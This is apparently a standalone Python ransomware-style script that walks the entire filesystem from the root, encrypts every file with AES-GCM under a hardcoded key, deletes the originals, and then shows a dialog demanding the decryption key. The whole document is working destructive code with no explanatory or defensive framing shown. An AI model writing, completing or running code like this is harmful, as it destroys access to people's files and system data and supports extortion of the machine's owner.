import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import simpledialog, messagebox

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        nonce = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        with open(file_path + '.enc', 'wb') as f:
            for x in (nonce, tag, ciphertext):
                f.write(x)
        
        os.remove(file_path)
        print(f"Encrypted {file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            nonce, tag, ciphertext = [f.read(x) for x in (12, 16, -1)]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)

        with open(file_path[:-4], 'wb') as f:
            f.write(data)
        
        os.remove(file_path)
        print(f"Decrypted {file_path}")
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

def encrypt_all_files(key):
    for root, dirs, files in os.walk('/'):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def decrypt_all_files(key):
    for root, dirs, files in os.walk('/'):
        for file in files:
            if file.endswith('.enc'):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)

def main():
    key = b"iamthemightyking"
    if len(key) not in [16, 24, 32]:
        print("Error: Key must be 16, 24, or 32 bytes long")
        return

    root = tk.Tk()
    root.withdraw()  # Hide the root window

    messagebox.showinfo("Info", "Encrypting all files on the laptop. This may take some time.")
    encrypt_all_files(key)
    messagebox.showinfo("Info", "All files have been encrypted. Enter the decryption key to decrypt.")
    
    decryption_key = simpledialog.askstring("Input", "Give me the decryption key:", show='*')
    if decryption_key and len(decryption_key) in [16, 24, 32]:
        decryption_key = decryption_key.encode()
        decrypt_all_files(decryption_key)
    else:
        messagebox.showerror("Error", "Invalid decryption key.")

if __name__ == "__main__":
    main()
